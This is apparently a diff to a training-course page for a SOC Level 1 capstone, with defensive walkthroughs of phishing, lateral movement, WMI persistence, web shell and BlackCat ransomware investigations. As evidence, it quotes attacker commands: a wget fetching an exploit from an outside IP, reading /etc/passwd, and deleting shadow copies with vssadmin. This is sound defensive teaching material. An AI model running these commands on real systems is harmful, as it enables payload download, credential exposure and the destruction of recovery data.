@@ -1,27 +1,158 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
 <h6 class="text-danger mb-3"><i class="bi bi-book me-2"></i>Module 14: SOC Level 1 Capstone Challenges</h6>
 
-<h6 class="text-danger mt-3">Sub-Domains / Rooms</h6>
-<ul style="color:#c0d0e0;">
-  <li><b>Tempest</b> — Full incident investigation: correlate PCAP, SIEM data, and email artifacts to trace the attack from initial access to exfiltration.</li>
-  <li><b>Boogeyman 1</b> — Investigate a multi-stage attack involving phishing, malware, and lateral movement across the network.</li>
-  <li><b>Boogeyman 2</b> — Deep-dive forensics: analyze memory dumps, registry hives, and timeline reconstruction.</li>
-  <li><b>Boogeyman 3</b> — Final phase: identify the threat actor, attribute the attack, and recommend remediation measures.</li>
-  <li><b>Hidden Hooks</b> — Investigate a hidden persistence mechanism and trace the attacker's post-exploitation activities.</li>
-  <li><b>Open Door</b> — Analyze an open-source intelligence (OSINT) investigation tied to a data breach scenario.</li>
-  <li><b>Upload and Conquer</b> — Investigate a web application breach involving file upload abuse and web shell deployment.</li>
-  <li><b>BlackCat</b> — Investigate a BlackCat/ALPHV ransomware incident: identify initial access, propagation, and encryption scope.</li>
-</ul>
+<p style="color:#c0d0e0;">The capstone module tests everything you've learned across all 13 previous modules. You'll investigate multi-stage attacks by correlating evidence from multiple sources: PCAPs, SIEM logs, email artifacts, and endpoint telemetry.</p>
 
+<h6 class="text-danger mt-3">Sub-Domains / Rooms</h6>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Tempest</p>
+<p style="color:#c0d0e0;">A full incident investigation: correlate PCAP, SIEM data, and email artifacts to trace the attack from initial access to exfiltration.</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> In the "Tempest" challenge, the analyst receives three artifacts: a PCAP file, SIEM logs, and a phishing email. The email shows the initial access (phishing link), the PCAP shows C2 beaconing and data exfiltration (2.3GB to external IP), and the SIEM logs show lateral movement (pass-the-hash to 12 servers). The analyst builds a complete timeline, identifies the root cause (employee clicked phishing link), determines the scope (12 servers compromised, customer data exfiltrated), and writes a report with containment and recovery recommendations.
+<b>Tempest Challenge Walkthrough:</b><br>
+<b>Evidence Provided:</b><br>
+- 1 PCAP file (network traffic capture)<br>
+- 24 hours of SIEM logs (Windows events + firewall logs)<br>
+- 1 phishing email (original .eml file)<br>
+- EDR snapshot (process list from compromised host)<br><br>
+<b>Step 1 — Email Analysis:</b><br>
+From: "IT Support" <support@c0mpany.com><br>
+Subject: "Urgent: Password Expiration Notice"<br>
+Attachment: PasswordReset.html (phishing page — collects credentials)<br>
+SPF: fail, DKIM: none, DMARC: none<br>
+→ Initial access vector: credential harvesting via phishing<br><br>
+<b>Step 2 — PCAP Analysis (Wireshark):</b><br>
+- HTTP POST to 45.33.32.156/login.php with credentials (user: j.smith, pass: Spring2026!)<br>
+- 30 minutes later: PowerShell encrypted connection to same IP on port 4444<br>
+- 2 hours later: SMB traffic to multiple internal servers (lateral movement)<br>
+- 4 hours later: Large outbound data transfer (2.3GB to 185.130.5.201)<br><br>
+<b>Step 3 — SIEM Log Analysis (Splunk):</b><br>
+<code>index=windows EventID=4624 Account_Name=j.smith | timechart count</code><br>
+- j.smith logged into 12 different servers in 2 hours (abnormal — lateral movement)<br>
+- EventID 4672 (admin logon) on DC-01 at 16:45 — attacker gained domain admin<br>
+- EventID 4720 — new user "helpdesk_adm" created (backdoor account)<br><br>
+<b>Step 4 — Determine Impact:</b><br>
+- 12 servers compromised<br>
+- Domain admin credentials stolen<br>
+- Customer database exfiltrated (2.3GB)<br>
+- Backdoor account created for persistent access<br><br>
+<b>Step 5 — Report & Remediation:</b><br>
+- Root cause: Employee fell for credential harvesting phishing email<br>
+- Containment: Reset all compromised accounts, isolate affected servers<br>
+- Eradication: Remove backdoor account, run EDR scan on all affected hosts<br>
+- Recovery: Restore database from pre-breach backup, enable MFA for all users<br>
+- Lessons learned: Implement DMARC enforcement, deploy phishing-resistant MFA, conduct security awareness training
 </div>
 
-<h6 class="text-danger mt-3">Key Skills Learned</h6>
-<ul style="color:#c0d0e0;">
-  <li>Multi-source evidence correlation</li>
-  <li>Full attack chain reconstruction</li>
-  <li>Incident timeline creation</li>
-  <li>Remediation and reporting</li>
-</ul>
+<p style="color:#00d4ff;font-weight:600;">🔹 Boogeyman 1, 2, 3</p>
+<p style="color:#c0d0e0;">A three-part investigation of a sophisticated multi-stage attack involving phishing, malware, lateral movement, and threat actor attribution.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Boogeyman Series Overview:</b><br><br>
+<b>Boogeyman 1 — Initial Access & Malware:</b><br>
+- Analyze a phishing email with malicious macro-enabled document<br>
+- Extract the VBA macro, decode the PowerShell payload, identify the malware (Cobalt Strike beacon)<br>
+- Trace the C2 infrastructure: domain registration details, IP history, SSL certificate<br>
+- Map techniques to MITRE ATT&CK: T1566.001 (Phishing), T1204.002 (User Execution), T1059.003 (PowerShell)<br><br>
+<b>Boogeyman 2 — Lateral Movement & Privilege Escalation:</b><br>
+- Analyze Windows Event Logs to trace the attacker's movement across the network<br>
+- Identify credential dumping (EventID 4663 — LSASS access, Sysmon Event 10)<br>
+- Track pass-the-hash attacks (EventID 4624 LogonType=3 with NTLM)<br>
+- Find privilege escalation to Domain Admin (EventID 4672 on DC)<br>
+- Map techniques: T1003.001 (LSASS Memory), T1550.002 (Pass-the-Hash), T1068 (Privilege Escalation)<br><br>
+<b>Boogeyman 3 — Exfiltration & Attribution:</b><br>
+- Analyze outbound network traffic for data exfiltration patterns<br>
+- Identify the exfiltration method (HTTPS to cloud storage, FTP, SMB)<br>
+- Use threat intel to attribute the attack to a specific threat actor group<br>
+- Write the final incident report with full timeline, IOCs, and recommendations<br>
+- Implement new detection rules to prevent similar attacks
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Hidden Hooks</p>
+<p style="color:#c0d0e0;">Investigate a sophisticated persistence mechanism that evaded initial detection.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Hidden Hooks Scenario:</b><br>
+A user reports their computer is slow. EDR shows no obvious malware. But there's unusual network traffic at 3 AM.<br><br>
+<b>Investigation:</b><br>
+- Check WMI persistence: <code>wmic /namespace:\\root\subscription PATH __EventFilter GET</code><br>
+- Find malicious WMI event subscription that runs PowerShell every hour<br>
+- The attacker used WMI persistence (T1546.003) — no files on disk, no registry Run keys<br>
+- WMI query: <code>SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'</code><br>
+- Action: Deletes beacon, executes from memory only — fileless malware<br><br>
+<b>Detection:</b> WMI persistence is invisible to file-based scans. Need Sysmon Event 19-21 (WMI) or audit WMI activity.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Open Door — OSINT Investigation</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Open Door Scenario:</b><br>
+A data breach occurred. Customer data was posted on a dark web forum. Your job is to use OSINT to investigate.<br><br>
+<b>OSINT Investigation Steps:</b><br>
+- Search the leaked data for patterns (email domains, password patterns, data formats)<br>
+- Identify the breach source: Was it a third-party vendor? An exposed database? A phishing campaign?<br>
+- Use Shodan to check if any company assets were exposed to the internet<br>
+- Use Have I Been Pwned to see if employee emails appear in other breaches<br>
+- Use DeHashed to search for company credentials in credential dumps<br>
+- Write a report with findings and recommend security improvements
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Upload and Conquer</p>
+<p style="color:#c0d0e0;">Investigate a web application breach involving file upload abuse and web shell deployment.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Upload and Conquer Scenario:</b><br>
+Your company's web application allows users to upload profile pictures. An attacker uploaded a PHP web shell disguised as an image.<br><br>
+<b>Detection:</b><br>
+- WAF alert: "File upload with PHP content detected" — POST /upload/profile.php<br>
+- File type mismatch: Uploaded as .jpg but content-type is application/x-php<br>
+- Subsequent requests: GET /uploads/profile.php?cmd=id (200 OK)<br>
+- Commands executed: whoami, uname -a, cat /etc/passwd, wget http://45.33.32.156/exploit<br><br>
+<b>Investigation:</b><br>
+- Check if the web shell accessed sensitive files or databases<br>
+- Look for lateral movement from the web server to internal systems<br>
+- Check if attacker uploaded additional files (backdoors, phishing pages)<br>
+- Review web server access logs for the full scope of compromise<br><br>
+<b>Remediation:</b><br>
+- Remove web shell and any other uploaded malicious files<br>
+- Implement file upload validation: check magic bytes, enforce extension matching<br>
+- Store uploads outside web root or in cloud storage with no execution permission<br>
+- Apply Content Security Policy (CSP) headers
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 BlackCat Ransomware Investigation</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>BlackCat/ALPHV Ransomware Scenario:</b><br>
+Critical alert: "Mass file encryption detected on FINANCE-SRV-01"<br><br>
+<b>Initial Detection:</b><br>
+- EDR alert: vssadmin.exe delete shadows /all /quiet (Volume Shadow Copy deletion — ransomware preparation)<br>
+- EDR alert: bcdedit.exe /set {default} recoveryenabled No (disables recovery)<br>
+- File system alert: .locked files appearing in shared drives (15,000+ files in 10 minutes)<br>
+- Ransom note: "README_TO_DECRYPT.txt" in every directory — demands 50 BTC (~$3M)<br><br>
+<b>Incident Response:</b><br>
+1. <b>Containment:</b> Isolate FINANCE-SRV-01 from network immediately. Block all SMB traffic from this host.<br>
+2. <b>Investigate initial access:</b> Check SIEM for recent alerts on FINANCE-SRV-01. Find EventID 4625 (3389 failed RDP attempts from 45.33.32.156 → then success). RDP was exposed to internet.<br>
+3. <b>Scope assessment:</b> Check which other servers have SMB connections to FINANCE-SRV-01. 3 other servers show similar encryption patterns.<br>
+4. <b>Persistence check:</b> Check for new accounts, scheduled tasks, and service installations on affected hosts.<br>
+5. <b>Backup check:</b> Are offline backups available? Yes — from 12 hours ago. Recovery is possible.<br><br>
+<b>Recovery:</b><br>
+- Restore affected servers from clean backups (pre-breach)<br>
+- Reset all account passwords on affected systems<br>
+- Close RDP port 3389 at firewall, require VPN + MFA for remote access<br>
+- Deploy EDR on all servers (FINANCE-SRV-01 didn't have EDR — "cost saving" decision)<br><br>
+<b>Lessons Learned:</b><br>
+- Exposed RDP without MFA was the root cause<br>
+- Missing EDR on critical servers delayed detection<br>
+- Offline backups saved the company ~$3M in ransom<br>
+- New rule: all internet-facing services require MFA + EDR
+</div>
+
+<h6 class="text-danger mt-3">Capstone Success Checklist</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>What Your Capstone Report Must Include:</b><br>
+1. <b>Executive Summary:</b> One paragraph — what happened, impact, and key finding<br>
+2. <b>Timeline:</b> Chronological sequence of attacker actions with timestamps and evidence references<br>
+3. <b>Initial Access:</b> How did the attacker get in? (Phishing? Vulnerability? Credentials?)<br>
+4. <b>Attack Chain:</b> Full kill chain from initial access to objectives — with MITRE ATT&CK mappings<br>
+5. <b>IOCs:</b> All hashes, IPs, domains, file paths, registry keys, and YARA rules<br>
+6. <b>Impact Assessment:</b> What data was accessed? What systems were compromised? Financial impact?<br>
+7. <b>Containment Actions:</b> What was done to stop the attack?<br>
+8. <b>Remediation Plan:</b> Steps to prevent reoccurrence (patch, config changes, new tools, training)<br>
+9. <b>Lessons Learned:</b> What went well? What could be improved? Action items with owners and deadlines
+</div>
 </div>
